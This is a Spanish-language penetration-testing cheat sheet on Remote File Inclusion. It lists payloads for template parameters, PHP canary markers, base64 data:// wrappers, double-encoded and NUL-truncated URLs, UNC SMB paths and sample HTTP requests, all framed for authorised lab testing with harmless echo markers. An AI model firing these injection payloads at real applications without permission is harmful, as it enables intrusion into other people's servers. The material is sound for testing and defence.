# 🗡️ Remote File Inclusion (RFI): payloads y técnicas

> **Uso autorizado:** sustituir `{ORIGEN}`, `{TOKEN_A}`, `{ID_PROPIO}` y `{ID_CONTROLADO_B}` por valores del entorno y de cuentas propias. No ejecutar muestras que cambien estado sin permiso específico y plan de reversión.

## 🎯 Preparación

- Capturar primero la solicitud legítima y su respuesta esperada.
- Mantener igual método, sesión, cabeceras y cuerpo salvo el campo bajo prueba.
- Usar un marcador único como `prueba-123` para distinguir reflejos y efectos de caché.

> **Lectura del banco:** cuando un bloque enumera varias URL, rutas, cabeceras o cuerpos, cada línea suele ser una alternativa. Elegir la variante que corresponde al motor, parser y flujo real.

## 💉 Payloads básicos

### URL remota en parámetros de plantilla

```text
?template=https://{SERVIDOR_PROPIO}/canary-{NONCE}.txt
?page=https://{SERVIDOR_PROPIO}/canary-{NONCE}.txt
?include=https://{SERVIDOR_PROPIO}/canary-{NONCE}.txt
```

**Cuándo usarlo:** La callback confirma un fetch; RFI exige que la aplicación incluya o evalúe el contenido remoto.

**Fuente:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md).


### Servidor propio con marcador PHP

```php
<?php echo "RFI-CANARY-{NONCE}"; ?>
```

**Cuándo usarlo:** Solo en laboratorio PHP y en un host propio. Distinguir salida calculada de reflejo del código fuente.

**Fuente:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md).


## 🧭 Payloads por contexto

### Esquemas y extensiones

```text
https://{SERVIDOR_PROPIO}/canary-{NONCE}.php
http://{SERVIDOR_PROPIO}/canary-{NONCE}.php
https://{SERVIDOR_PROPIO}/canary-{NONCE}.txt
```

**Cuándo usarlo:** Son alternativas HTTP: cambiar solo esquema o extensión por solicitud. El servidor propio debe entregar el código PHP como texto sin ejecutarlo; una callback o ejecución en el servidor emisor no prueba inclusión en el destino.

**Fuente:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md).


## 🔥 Payloads avanzados

### Wrapper data de PHP en sandbox

```text
data://text/plain;base64,PD9waHAgZWNobyAiUkZJLUNBTkFSWSI7Pz4=
data://text/plain,%3C%3Fphp%20echo%20%22RFI-CANARY%22%3B%3F%3E
```

**Cuándo usarlo:** Dos codificaciones del mismo marcador PHP. Si se inserta en un parámetro URL, codificar también el valor exterior. Requiere un include PHP compatible y allow_url_include habilitado; observar RFI-CANARY ejecutado en el destino.

**Fuente:** [www.php.net](https://www.php.net/manual/en/wrappers.data.php).


### Normalización y ruta impuesta por el backend

```text
https%253A%252F%252F{SERVIDOR_PROPIO}%252Fcanary-{NONCE}.php
https://{SERVIDOR_PROPIO}/canary-{NONCE}.php%00
https://{SERVIDOR_PROPIO}/canary-{NONCE}.php?x=.php
```

**Cuándo usarlo:** Doble decodificación y NUL dependen del stack; comprobar en logs del servidor propio qué URL se pidió.

**Fuente:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md).


## 🔬 Pruebas guiadas por escenario

### 1. Include HTTPS a canary propio

**Objetivo:** Comprobar si un parámetro de plantilla acepta una URL remota.

```http
GET /view?template=https%3A%2F%2F{CONTROLLED_HOST}%2Fcanary-{NONCE}.txt HTTP/1.1
Host: {ORIGEN}
```

**Interpretación:** Una callback externa demuestra fetch; solo se habla de RFI si el contenido entra al intérprete o plantilla.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion).

### 2. UNC SMB en Windows de laboratorio

**Objetivo:** Solo en servidor Windows con include de rutas UNC, apuntar a un share SMB propio.

```text
\\{HOST_SMB_PROPIO}\share\canary-{NONCE}.php
```

**Interpretación:** Una conexión SMB no demuestra evaluación; confirmar el marcador de PHP servido por el share y no usar rutas ajenas.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion).

### 3. Contenido PHP inocuo en laboratorio

**Objetivo:** Distinguir inclusión textual de evaluación por intérprete PHP.

```php
<?php echo "RFI-CANARY-{NONCE}"; ?>
```

**Interpretación:** Servir el código PHP crudo como texto desde un host propio; si el servidor remoto lo ejecuta antes de entregarlo, el marcador no demuestra evaluación en el objetivo.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion).

### 4. Extensión añadida por backend

**Objetivo:** Solo en PHP anterior a 5.3.4, comprobar truncamiento NUL cuando la app concatena .php.

```text
https://{CONTROLLED_HOST}/plantilla-{NONCE}%00
```

**Interpretación:** Verificar versión y URL pedida al host propio. PHP moderno rechaza NUL; un error de parser no confirma inclusión.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion).

### 5. Doble codificación de URL

**Objetivo:** Identificar si dos decoders transforman la URL remota.

```text
https%253A%252F%252F{CONTROLLED_HOST}%252Fcanary-{NONCE}.txt
```

**Interpretación:** Una callback tras doble decodificación indica discrepancia de parser, no necesariamente evaluación.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion).

### 6. Ruta local como control

**Objetivo:** Comparar con la plantilla legítima local.

```http
GET /view?template={PLANTILLA_PERMITIDA} HTTP/1.1
Host: {ORIGEN}
```

**Interpretación:** Identificar renderizado legítimo y tipo de respuesta; el control local no prueba ni descarta por sí solo inclusión remota.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion).

### 7. Wrapper data en laboratorio

**Objetivo:** Comprobar si un include PHP permite el wrapper data con código PHP inocuo.

```text
data://text/plain;base64,{BASE64_DE_PHP_ECHO_CANARY}
```

**Interpretación:** Generar el Base64 de un echo PHP propio. Requiere allow_url_include y allow_url_fopen; si se evalúa, es inclusión de código vía data, no fetch remoto.

**Fuente técnica:** [www.php.net](https://www.php.net/manual/en/wrappers.data.php).

## ✅ Evidencia mínima

1. Solicitud de control y solicitud modificada, con diferencias visibles.
2. Respuesta o efecto observado en una cuenta/objeto de prueba independiente.
3. Explicación del control que falló y del alcance real comprobado.

---

[📖 Descripción y análisis](../Descripcion/README.md) · [← Índice general](../../README.md)
